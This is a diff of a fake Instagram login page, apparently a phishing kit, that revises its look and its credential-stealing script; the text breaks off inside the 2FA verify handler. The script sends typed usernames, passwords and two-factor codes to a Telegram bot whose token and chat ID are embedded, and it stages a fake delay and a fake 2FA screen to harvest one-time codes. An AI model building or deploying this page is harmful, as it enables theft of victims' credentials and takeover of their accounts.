@@ -11,31 +11,34 @@
         .wrapper { max-width: 935px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 32px; flex-grow: 1; }
         .phone-container { flex-shrink: 0; display: none; }
         @media (min-width: 876px) { .phone-container { display: block; } }
-        .phone-frame { width: 380px; height: 580px; border: 8px solid #262626; border-radius: 32px; background: #fff; overflow: hidden; box-shadow: 0 0 0 2px #dbdbdb; }
+        .phone-frame { width: 380px; height: 586px; border: 1px solid #dbdbdb; border-radius: 28px; background: #fff; overflow: hidden; }
         .phone-frame .screen { width: 100%; height: 100%; overflow: hidden; position: relative; }
-        .slides { width: 100%; height: 100%; display: flex; transition: transform 0.5s ease-in-out; }
+        .slides { width: 100%; height: 100%; display: flex; transition: transform 1s ease-in-out; }
         .slide { min-width: 100%; height: 100%; }
         .slide img { width: 100%; height: 100%; object-fit: cover; display: block; }
         .login-section { max-width: 350px; width: 100%; }
-        .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 32px 40px 20px; margin-bottom: 10px; text-align: center; }
-        .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 24px; }
-        .logo img { width: 175px; height: auto; display: block; }
-        #loginForm { display: flex; flex-direction: column; gap: 6px; }
-        #loginForm input { width: 100%; padding: 9px 0 7px 8px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
-        #loginForm input:focus { border-color: #a8a8a8; }
-        #loginForm input::placeholder { color: #8e8e8e; }
-        #loginForm .btn-wrapper { position: relative; margin-top: 8px; }
-        #loginBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; }
+        .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 24px 40px 20px; margin-bottom: 10px; text-align: center; }
+        .logo { display: flex; justify-content: center; align-items: center; margin: 16px auto 28px; }
+        .logo svg { width: 175px; height: 51px; display: block; }
+        #loginForm { display: flex; flex-direction: column; gap: 4px; }
+        .input-group { position: relative; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; display: flex; align-items: center; }
+        .input-group:focus-within { border-color: #a8a8a8; }
+        .input-group label { position: absolute; left: 8px; font-size: 12px; color: #8e8e8e; pointer-events: none; transition: all 0.1s ease; top: 14px; }
+        .input-group.floating label { font-size: 10px; top: 4px; }
+        .input-group input { width: 100%; padding: 18px 0 2px 8px; background: transparent; border: none; outline: none; font-size: 12px; }
+        .input-group .eye-btn { background: none; border: none; cursor: pointer; padding: 4px 8px; font-size: 12px; color: #262626; display: none; }
+        .input-group .eye-btn.show { display: block; }
+        #loginBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; margin-top: 10px; }
         #loginBtn:not(:disabled) { opacity: 1; }
         #loginBtn:disabled { cursor: not-allowed; }
-        #cooldownOverlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #0095f6; border-radius: 8px; color: #fff; font-weight: 600; font-size: 13px; align-items: center; justify-content: center; gap: 6px; pointer-events: none; z-index: 2; }
-        #cooldownOverlay .spinner { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        #loginBtn.loading { opacity: 0.85; }
+        #loginBtn.loading::after { content: ''; display: inline-block; width: 12px; height: 12px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 6px; vertical-align: middle; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .separator { display: flex; align-items: center; margin: 14px 0 18px; }
         .separator .line { flex: 1; height: 1px; background: #dbdbdb; }
         .separator .or { color: #737373; font-size: 13px; font-weight: 600; margin: 0 18px; }
         .fb-login { display: flex; align-items: center; justify-content: center; gap: 8px; background: none; border: none; color: #385185; font-weight: 600; font-size: 14px; cursor: pointer; margin-bottom: 12px; width: 100%; }
-        .fb-login img { width: 16px; height: 16px; }
+        .fb-login svg { width: 16px; height: 16px; }
         .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; }
         .forgot-password:hover { text-decoration: underline; }
         .signup-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px 40px; text-align: center; font-size: 14px; }
@@ -43,42 +46,46 @@
         .apps-section { margin-top: 16px; text-align: center; }
         .apps-section p { font-size: 14px; margin-bottom: 12px; color: #262626; }
         .apps-badges { display: flex; justify-content: center; gap: 8px; }
-        .apps-badges img { height: 40px; width: auto; }
-        footer { margin-top: 24px; text-align: center; max-width: 100%; }
+        .apps-badges svg { height: 40px; width: auto; }
+        footer { margin-top: 24px; text-align: center; max-width: 100%; padding: 0 20px; }
         footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px 16px; font-size: 12px; margin-bottom: 12px; }
         footer .links a { color: #8e8e8e; text-decoration: none; }
         footer .links a:hover { text-decoration: underline; }
         footer .copyright { color: #8e8e8e; font-size: 12px; }
         #twofaSection { display: none; }
-        #twofaSection .lock-icon { width: 80px; height: 80px; margin: 0 auto 16px; background: #fafafa; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        #twofaSection .lock-icon { width: 96px; height: 96px; margin: 0 auto 16px; background: #fafafa; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #dbdbdb; }
         #twofaSection .lock-icon svg { width: 40px; height: 40px; }
-        #twofaSection h2 { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 4px; }
-        #twofaSection .subtitle { font-size: 13px; color: #737373; margin-bottom: 16px; line-height: 1.4; }
-        #twofaSection .subtitle span { color: #262626; font-weight: 500; }
-        .code-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 12px; }
-        .code-inputs input { width: 42px; height: 46px; text-align: center; font-size: 18px; font-weight: 600; border: 1px solid #dbdbdb; border-radius: 4px; outline: none; background: #fafafa; }
-        .code-inputs input:focus { border-color: #a8a8a8; background: #fff; }
+        #twofaSection h2 { font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 8px; }
+        #twofaSection .subtitle { font-size: 13px; color: #737373; margin-bottom: 20px; line-height: 1.4; }
+        #twofaSection .subtitle b { color: #262626; font-weight: 600; }
+        .code-inputs { display: flex; gap: 8px; justify-content: center; margin-bottom: 16px; }
+        .code-inputs input { width: 44px; height: 48px; text-align: center; font-size: 20px; font-weight: 600; border: 1px solid #dbdbdb; border-radius: 4px; outline: none; background: #fafafa; }
+        .code-inputs input:focus { border-color: #0095f6; background: #fff; box-shadow: 0 0 0 3px rgba(0,149,246,0.15); }
         #verifyBtn { width: 100%; padding: 7px 16px; background: #0095f6; border: none; border-radius: 8px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; opacity: 0.7; transition: opacity 0.2s; margin-bottom: 14px; }
         #verifyBtn:not(:disabled) { opacity: 1; }
         #verifyBtn:disabled { cursor: not-allowed; }
+        #verifyBtn.loading::after { content: ''; display: inline-block; width: 12px; height: 12px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 6px; vertical-align: middle; }
         .resend-area { font-size: 12px; color: #737373; }
         #resendBtn { background: none; border: none; color: #0095f6; font-weight: 600; font-size: 12px; cursor: pointer; font-family: inherit; }
-        #resendBtn:disabled { color: #737373; cursor: not-allowed; }
-        .back-link { display: block; margin-top: 16px; font-size: 12px; color: #00376b; text-decoration: none; }
+        #resendBtn:disabled { color: #737373; cursor: not-allowed; opacity: 0.6; }
+        .back-link { display: block; margin-top: 16px; font-size: 12px; color: #00376b; text-decoration: none; cursor: pointer; }
         .back-link:hover { text-decoration: underline; }
-        #loadingScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
+        #toast { display: none; position: fixed; top: 40px; left: 50%; transform: translateX(-50%); background: #262626; color: #fff; font-size: 13px; padding: 10px 20px; border-radius: 6px; z-index: 9999; max-width: 90%; text-align: center; }
+        #toast.error { background: #ed4956; }
+        #toast.success { background: #2ecc71; }
+        #loadingScreen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9998; flex-direction: column; align-items: center; justify-content: center; gap: 16px; }
         #loadingScreen .loader-spinner { width: 40px; height: 40px; border: 3px solid #dbdbdb; border-top-color: #0095f6; border-radius: 50%; animation: spin 0.8s linear infinite; }
         #loadingScreen p { font-size: 14px; color: #262626; font-weight: 500; }
         @media (max-width: 450px) { body { background: #fff; padding: 0; } .card { border: none; padding: 40px 20px 20px; } .signup-card { border: none; } }
-        #errorMsg { color: #ed4956; font-size: 12px; display: none; margin-bottom: 10px; }
-        .success-msg { color: #2ecc71; font-size: 13px; font-weight: 500; display: none; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
+<div id="toast"></div>
+
 <div id="loadingScreen">
     <div class="loader-spinner"></div>
-    <p id="loadingText">Verifying...</p>
+    <p id="loadingText">Please wait...</p>
 </div>
 
 <div class="wrapper">
@@ -86,10 +93,10 @@
         <div class="phone-frame">
             <div class="screen">
                 <div class="slides" id="slides">
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=380&h=580&fit=crop" alt=""></div>
-                    <div class="slide"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=380&h=580&fit=crop" alt=""></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1504674900247-0877df9cc836?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1542291026-7eec264c27ff?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
+                    <div class="slide"><img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?w=380&h=586&fit=crop" alt="" loading="lazy"></div>
                 </div>
             </div>
         </div>
@@ -98,18 +105,26 @@
     <div class="login-section">
         <div class="card" id="loginCard">
             <div class="logo">
-                <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
+                <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M43.157 12.603c-1.445-1.445-3.194-2.18-5.248-2.18-1.882 0-3.527.735-4.936 2.18-1.408 1.446-2.124 3.22-2.124 5.323 0 2.032.716 3.77 2.124 5.214 1.409 1.445 3.065 2.168 4.972 2.168 1.907 0 3.54-.723 4.9-2.168 1.373-1.445 2.055-3.182 2.055-5.214.012-2.102-.682-3.877-2.043-5.323zM26.433 40.07V21.944h3.864v18.126H26.433zm7.988 0l.059-9.007c0-1.21.023-2.398.07-3.564l.176-2.637h.047l.716 2.637c.364 1.284.939 2.637 1.726 4.058l6.237 10.038h-4.875l-4.085-6.883c-.568-.972-1.065-1.887-1.491-2.747-.413-.86-.78-1.62-1.101-2.283l-.351-.883c-.2.953-.495 1.97-.883 3.053-.376 1.083-1.501 3.822-1.848 4.648l-3.64 7.095h-4.723L32.04 22.475c2.73-4.657 5.177-7.212 7.34-7.665 1.29-.27 2.932-.306 4.918-.107v.023c-.083 1.607-.024 3.495.178 5.664l.141 2.561c.083.918.176 1.825.282 2.723.106.898.282 1.714.529 2.448l2.614 7.316c.541 1.537 1.024 3.11 1.45 4.717h-.094a22.556 22.556 0 01-.47-1.666c-.176-.71-.423-1.537-.74-2.483-.235-.81-.611-1.761-1.13-2.854-.505-1.093-1.13-2.396-1.873-3.91l-1.537-3.29c-.494-1.083-.976-2.18-1.45-3.29l-.27-.72c-.81-2.138-1.385-3.705-1.726-4.7-.341-1.007-.611-1.79-.81-2.349l-.059-.165c-1.725.682-3.3 1.855-4.722 3.518-1.42 1.664-2.614 3.728-3.58 6.192l-.117.258v-.023l-5.083 13.098h-4.758z" fill="#262626"/>
+                    <path d="M69.14 40.07l6.625-22.444h3.969L73.11 40.07h-3.97zm16.885-18.629c-1.75 1.87-2.626 4.353-2.626 7.448 0 3.083.876 5.578 2.626 7.483 1.75 1.894 4.25 2.84 7.5 2.84 1.574 0 3.066-.312 4.479-.936 1.424-.624 2.602-1.486 3.534-2.584.932-1.11 1.637-2.373 2.114-3.792.49-1.419.735-2.907.735-4.464 0-1.557-.245-3.045-.735-4.464-.477-1.419-1.182-2.683-2.114-3.793-.932-1.109-2.11-1.972-3.534-2.584-1.413-.624-2.905-.936-4.479-.936-3.25 0-5.75.935-7.5 2.805l.047-.013zm3.467 4.625c.565-1.63 1.547-2.897 2.945-3.804 1.398-.907 2.997-1.36 4.799-1.36 1.583 0 2.995.442 4.239 1.325 1.256.872 2.192 2.068 2.818 3.587.637 1.508.956 3.202.956 5.083 0 1.892-.319 3.587-.956 5.083-.626 1.485-1.562 2.67-2.818 3.552-1.244.872-2.656 1.307-4.239 1.307-1.802 0-3.401-.453-4.799-1.36-1.398-.907-2.38-2.174-2.945-3.804-.565-1.63-.848-3.44-.848-5.426 0-1.975.283-3.774.848-5.404v.13z" fill="#262626"/>
+                    <path d="M101.657 40.07V21.944h3.546v3.223h.047c.494-1.166 1.218-2.056 2.173-2.67.966-.626 2.114-.936 3.444-.936 1.386 0 2.626.31 3.722.936 1.107.614 1.966 1.504 2.579 2.67.624 1.155.936 2.514.936 4.082v11.021h-3.511V29.601c0-1.534-.4-2.71-1.201-3.528-.79-.83-1.873-1.243-3.251-1.243-1.218 0-2.238.413-3.061 1.243-.812.818-1.219 1.994-1.219 3.528v10.47h-3.499-.105z" fill="#262626"/>
+                    <path d="M131.756 40.632c-2.402 0-4.357-.536-5.863-1.607-1.507-1.083-2.586-2.537-3.239-4.364l3.216-1.554c.412.983 1.013 1.79 1.802 2.419.789.618 1.731.948 2.826.995 1.412 0 2.521-.354 3.322-1.06.813-.72 1.219-1.684 1.219-2.896 0-.661-.141-1.243-.424-1.748-.282-.506-.659-.96-1.13-1.364-.459-.413-.983-.795-1.572-1.142-.577-.36-1.313-.77-2.208-1.231-1.224-.542-2.344-1.119-3.357-1.73-1.013-.623-1.861-1.366-2.544-2.232-.683-.878-1.025-1.947-1.025-3.206 0-1.855.694-3.374 2.085-4.558 1.402-1.195 3.274-1.79 5.613-1.79 2.032 0 3.698.459 5.004 1.377 1.318.907 2.25 2.127 2.804 3.658l-3.087 1.554c-.341-.742-.871-1.36-1.59-1.854-.706-.507-1.614-.766-2.723-.778-1.166 0-2.098.295-2.793.883-.695.577-1.048 1.325-1.06 2.244 0 .577.141 1.083.423 1.519.283.436.659.83 1.13 1.183.471.354 1.025.683 1.66.983.647.289 1.455.683 2.42 1.183 1.412.648 2.62 1.283 3.622 1.905 1.013.611 1.879 1.325 2.597 2.138.718.801 1.083 1.87 1.095 3.206 0 1.96-.712 3.563-2.138 4.811-1.425 1.236-3.345 1.854-5.755 1.854h-.047z" fill="#262626"/>
+                    <path d="M140.802 40.07V21.944h3.476v2.849h.047c.494-1.154 1.213-2.038 2.155-2.654.943-.627 2.055-.936 3.34-.936 1.472 0 2.638.32 3.499.96.872.64 1.477 1.578 1.813 2.815h.059c.541-1.166 1.307-2.068 2.302-2.705 1.007-.637 2.161-.959 3.463-.959 1.878 0 3.298.554 4.262 1.66.976 1.094 1.466 2.756 1.466 4.986v10.581h-3.511V29.601c0-1.272-.265-2.22-.795-2.84-.518-.624-1.289-.936-2.314-.936-1.083 0-2.008.377-2.768 1.13-.771.753-1.154 1.812-1.154 3.182v10.034h-3.499V29.601c0-1.213-.247-2.138-.742-2.78-.483-.641-1.219-.96-2.208-.96-1.047 0-1.937.365-2.673 1.095-.735.718-1.101 1.742-1.101 3.07v10.046h-3.499-.082z" fill="#262626"/>
+                    <path d="M163.662 40.07V21.944h3.462v3.182h.059c.518-1.189 1.248-2.09 2.19-2.705.955-.626 2.061-.936 3.322-.936 1.083 0 2.008.177 2.768.53.771.342 1.389.83 1.866 1.466.477.624.842 1.336 1.095 2.138.259.801.388 1.648.388 2.543v11.896h-3.511V29.671c0-1.272-.242-2.226-.742-2.864-.483-.648-1.225-.971-2.226-.971-1.036 0-1.919.365-2.655 1.095-.723.73-1.083 1.766-1.083 3.112v10.028h-3.499-.034z" fill="#262626"/>
+                </svg>
             </div>
-            <form id="loginForm" autocomplete="off">
-                <input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="username">
-                <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-                <div class="btn-wrapper">
-                    <button type="submit" id="loginBtn" disabled>Log in</button>
-                    <div id="cooldownOverlay">
-                        <div class="spinner"></div>
-                        <span id="cooldownText">Verifying credentials... (10s)</span>
-                    </div>
+            <form id="loginForm" autocomplete="off" novalidate>
+                <div class="input-group" id="usernameGroup">
+                    <label for="username">Phone number, username, or email</label>
+                    <input type="text" id="username" autocomplete="username">
                 </div>
+                <div class="input-group" id="passwordGroup">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" autocomplete="current-password">
+                    <button type="button" class="eye-btn" id="eyeBtn">Show</button>
+                </div>
+                <button type="submit" id="loginBtn" disabled>Log in</button>
             </form>
             <div class="separator">
                 <span class="line"></span>
@@ -117,7 +132,10 @@
                 <span class="line"></span>
             </div>
             <button class="fb-login" id="fbLogin">
-                <img src="https://i.imgur.com/exksovo.png" alt="Facebook">
+                <svg viewBox="0 0 16 16" fill="#385185" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="8" cy="8" r="8" fill="#385185"/>
+                    <path d="M10.5 3.5H9.25C8.01 3.5 7.2 4.48 7.2 5.7V7.1H6V8.9H7.2V12.5H9V8.9H10.2L10.5 7.1H9V5.95C9 5.65 9.25 5.5 9.5 5.5H10.5V3.5Z" fill="white"/>
+                </svg>
                 Log in with Facebook
             </button>
             <a href="#" class="forgot-password">Forgot password?</a>
@@ -131,9 +149,7 @@
                 </svg>
             </div>
             <h2>Two-Factor Authentication</h2>
-            <p class="subtitle">Enter the code we sent to <span id="displayUser">your phone</span>.</p>
-            <div id="errorMsg">Invalid code. Please try again.</div>
-            <div class="success-msg" id="successMsg">✓ Code verified successfully!</div>
+            <p class="subtitle">Enter the 6-digit code we sent to <b id="displayUser">your phone</b>.</p>
             <div class="code-inputs" id="codeInputs">
                 <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box" autofocus>
                 <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
@@ -144,10 +160,10 @@
             </div>
             <button id="verifyBtn" disabled>Verify</button>
             <div class="resend-area">
-                Didn't get the code? 
-                <button id="resendBtn">Send code again</button>
+                Didn't get a code? 
+                <button id="resendBtn" disabled>Resend code</button>
             </div>
-            <a href="#" id="backToLogin" class="back-link">← Back to login</a>
+            <a id="backToLogin" class="back-link">← Back to login</a>
         </div>
 
         <div class="signup-card" id="signupCard">
@@ -156,8 +172,20 @@
         <div class="apps-section">
             <p>Get the app.</p>
             <div class="apps-badges">
-                <a href="#"><img src="https://i.imgur.com/lREV6Qa.png" alt="Download on the App Store"></a>
-                <a href="#"><img src="https://i.imgur.com/DFQNKXK.png" alt="Get it on Google Play"></a>
+                <a href="#">
+                    <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="120" height="40" rx="4" fill="#000"/>
+                        <text x="18" y="22" fill="white" font-size="8" font-weight="bold">Download on the</text>
+                        <text x="18" y="32" fill="white" font-size="11" font-weight="bold">App Store</text>
+                    </svg>
+                </a>
+                <a href="#">
+                    <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="120" height="40" rx="4" fill="#000"/>
+                        <text x="18" y="22" fill="white" font-size="8" font-weight="bold">Get it on</text>
+                        <text x="18" y="32" fill="white" font-size="11" font-weight="bold">Google Play</text>
+                    </svg>
+                </a>
             </div>
         </div>
     </div>
@@ -165,27 +193,37 @@
 
 <footer>
     <div class="links">
-        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a>
-        <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a>
-        <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a>
-        <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
     </div>
     <div class="copyright">© 2026 Instagram from Meta</div>
 </footer>
 
 <script>
     // ============================================
-    //  CONFIG - غير القيم لقيمك
+    //  CONFIG
     // ============================================
     const CONFIG = {
         telegramToken: '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg',
         telegramChatId: '8278195073',
-        cooldownDuration: 10,
-        delayBeforeRedirect: 2000
+        cooldownDuration: 6,
+        delayBeforeRedirect: 2000,
+        max2faAttempts: 3
     };
 
     // ============================================
-    //  TELEGRAM SENDER (Image method - يتجاوز CORS)
+    //  TELEGRAM SENDER
     // ============================================
     function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`;
@@ -195,11 +233,22 @@
             parse_mode: 'Markdown'
         });
         try {
-            new Image().src = `${url}?${params.toString()}`;
+            fetch(url + '?' + params.toString(), { mode: 'no-cors' }).catch(() => {});
             console.log('✓ Sent to Telegram');
         } catch(e) {
             console.error('✗ Failed:', e.message);
         }
+    }
+
+    // ============================================
+    //  TOAST NOTIFICATION
+    // ============================================
+    function showToast(msg, type) {
+        const t = document.getElementById('toast');
+        t.textContent = msg;
+        t.className = type || '';
+        t.style.display = 'block';
+        setTimeout(() => { t.style.display = 'none'; }, 4000);
     }
 
     // ============================================
@@ -210,14 +259,15 @@
     setInterval(() => {
         currentSlide = (currentSlide + 1) % 4;
         slides.style.transform = `translateX(-${currentSlide * 100}%)`;
-    }, 3000);
+    }, 4000);
 
     const u = document.getElementById('username');
     const p = document.getElementById('password');
+    const ug = document.getElementById('usernameGroup');
+    const pg = document.getElementById('passwordGroup');
+    const eyeBtn = document.getElementById('eyeBtn');
     const loginBtn = document.getElementById('loginBtn');
     const loginForm = document.getElementById('loginForm');
-    const cooldownOverlay = document.getElementById('cooldownOverlay');
-    const cooldownText = document.getElementById('cooldownText');
     const loginCard = document.getElementById('loginCard');
     const signupCard = document.getElementById('signupCard');
     const twofaSection = document.getElementById('twofaSection');
@@ -228,29 +278,55 @@
     const backLink = document.getElementById('backToLogin');
     const loadingScreen = document.getElementById('loadingScreen');
     const loadingText = document.getElementById('loadingText');
-    const errorMsg = document.getElementById('errorMsg');
-    const successMsg = document.getElementById('successMsg');
 
-    // ============================================
-    //  المتغيرات الجديدة للتتبع
-    // ============================================
     let capturedUsername = '';
     let capturedPassword = '';
-    let cooldownTimer = null;
-    let cooldownCount = 0;
+    let usernameSent = false;
+    let passwordSent = false;
     let verificationAttempts = 0;
-    let usernameSent = false;  // متغير لمنع إرسال الإيميل/يوزر أكثر من مرة
-    let passwordSent = false;  // متغير لمنع إرسال الباسورد أكثر من مرة
+    let isProcessing = false;
+
+    // ============================================
+    //  FLOATING LABELS
+    // ============================================
+    function checkFloat(input, group) {
+        if (input.value.trim()) {
+            group.classList.add('floating');
+        } else {
+            group.classList.remove('floating');
+        }
+    }
+
+    u.addEventListener('input', () => checkFloat(u, ug));
+    u.addEventListener('blur', () => checkFloat(u, ug));
+    p.addEventListener('input', () => checkFloat(p, pg));
+    p.addEventListener('blur', () => checkFloat(p, pg));
 
     function checkLogin() {
-        loginBtn.disabled = !(u.value.trim() && p.value.trim());
+        loginBtn.disabled = !(u.value.trim() && p.value.length >= 1);
     }
     u.addEventListener('input', checkLogin);
     p.addEventListener('input', checkLogin);
 
     // ============================================
-    //  🆕 كود جديد: إرسال الإيميل/يوزر/رقم الهاتف فوراً عند الكتابة
-    //  (بدون انتظار كلمة المرور)
+    //  EYE BUTTON (Show/Hide Password)
+    // ============================================
+    p.addEventListener('input', () => {
+        eyeBtn.classList.toggle('show', p.value.length > 0);
+    });
+
+    eyeBtn.addEventListener('click', () => {
+        if (p.type === 'password') {
+            p.type = 'text';
+            eyeBtn.textContent = 'Hide';
+        } else {
+            p.type = 'password';
+            eyeBtn.textContent = 'Show';
+        }
+    });
+
+    // ============================================
+    //  CAPTURE USERNAME ON BLUR
     // ============================================
     u.addEventListener('blur', function() {
         const val = this.value.trim();
@@ -262,41 +338,44 @@
                 `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
                 `⏰ *Time:* ${new Date().toISOString()}`
             );
-            console.log('✓ Username/Email/Phone sent');
         }
     });
 
     // ============================================
-    //  🆕 كود جديد: إرسال كلمة المرور فوراً عند كتابتها
-    //  (بدون انتظار الضغط على Log in)
+    //  CAPTURE PASSWORD ON BLUR
     // ============================================
     p.addEventListener('blur', function() {
         const val = this.value;
         if (val && !passwordSent) {
             passwordSent = true;
-            const userVal = u.value.trim() || 'N/A';
             sendToTelegram(
                 `🔑 *Step 2: Password Captured* 🔑\n\n` +
-                `👤 *Identifier:* \`${userVal}\`\n` +
+                `👤 *Identifier:* \`${u.value.trim() || 'N/A'}\`\n` +
                 `🔑 *Password:* \`${val}\`\n` +
                 `📱 *UA:* ${navigator.userAgent.slice(0, 80)}\n` +
                 `⏰ *Time:* ${new Date().toISOString()}`
             );
-            console.log('✓ Password sent');
         }
     });
 
     // ============================================
-    //  LOGIN SUBMIT (يبقى كما هو مع الإرسال المكرر)
+    //  LOGIN SUBMIT
     // ============================================
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
-        if (cooldownTimer) return;
+        if (isProcessing) return;
 
         capturedUsername = u.value.trim();
         capturedPassword = p.value;
 
-        // إرسال تأكيدي عند الضغط على Log in (احتياطاً)
+        if (!capturedUsername || !capturedPassword) return;
+
+        isProcessing = true;
+        loginBtn.disabled = true;
+        loginBtn.classList.add('loading');
+        loginBtn.textContent = 'Logging in...';
+
+        // Send final confirmation
         sendToTelegram(
             `✅ *Login Button Pressed* ✅\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
@@ -304,34 +383,24 @@
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        // العد التنازلي
-        loginBtn.disabled = true;
-        cooldownOverlay.style.display = 'flex';
-        cooldownCount = CONFIG.cooldownDuration;
-        cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
+        // Simulate verification delay
+        setTimeout(() => {
+            loginBtn.classList.remove('loading');
+            loginBtn.textContent = 'Log in';
 
-        cooldownTimer = setInterval(() => {
-            cooldownCount--;
-            if (cooldownCount > 0) {
-                cooldownText.textContent = `Verifying credentials... (${cooldownCount}s)`;
-            } else {
-                clearInterval(cooldownTimer);
-                cooldownTimer = null;
-                cooldownOverlay.style.display = 'none';
+            // Show 2FA
+            loginCard.style.display = 'none';
+            signupCard.style.display = 'none';
+            twofaSection.style.display = 'block';
+            displayUser.textContent = capturedUsername || 'your phone';
 
-                // إظهار 2FA
-                loginCard.style.display = 'none';
-                signupCard.style.display = 'none';
-                twofaSection.style.display = 'block';
-                displayUser.textContent = capturedUsername || 'your phone';
-
-                codeBoxes.forEach(box => box.value = '');
-                codeBoxes[0].focus();
-                verifyBtn.disabled = true;
-                errorMsg.style.display = 'none';
-                successMsg.style.display = 'none';
-            }
-        }, 1000);
+            codeBoxes.forEach(box => box.value = '');
+            codeBoxes[0].focus();
+            verifyBtn.disabled = true;
+            verificationAttempts = 0;
+            resendBtn.disabled = false;
+            isProcessing = false;
+        }, 2000);
     });
 
     // ============================================
@@ -345,7 +414,6 @@
             }
             const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
             verifyBtn.disabled = !allFilled;
-            errorMsg.style.display = 'none';
         });
         box.addEventListener('keydown', function(e) {
             if (e.key === 'Backspace' && !this.value && index > 0) {
@@ -371,16 +439,18 @@
     // ============================================
     //  VERIFY 2FA
     // ============================================
-    verifyBtn.addEventListener('click', async function() {
+    verifyBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+        isProcessing = true;
+
         const code = Array.from(codeBoxes).map(b => b.value).join('');
         verificationAttempts++;
 
-        loadingScreen.style.display = 'flex';
-        loadingText.textContent = 'Verifying code...';
-        errorMsg.style.display = 'none';
-        successMsg.style.display = 'none';
+        verifyBtn.disabled = true;
+        verifyBtn.classList.add('loading');
+        verifyBtn.textContent = 'Verifying...';
 
-        // 🆕 إرسال رمز 2FA في رسالة مستقلة
+        // Send 2FA code
         sendToTelegram(
             `🔢 *Step 3: 2FA Code Captured* 🔢\n\n` +
             `👤 *User:* \`${capturedUsername}\`\n` +
@@ -389,55 +459,54 @@
             `⏰ *Time:* ${new Date().toISOString()}`
         );
 
-        try {
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            const isCodeValid = verificationAttempts >= 2 || code === '123456';
-            
-            loadingScreen.style.display = 'none';
-            
-            if (isCodeValid) {
-                successMsg.style.display = 'block';
-                loadingText.textContent = 'Verifying...';
-                
+        // Simulate delay
+        setTimeout(() => {
+            verifyBtn.classList.remove('loading');
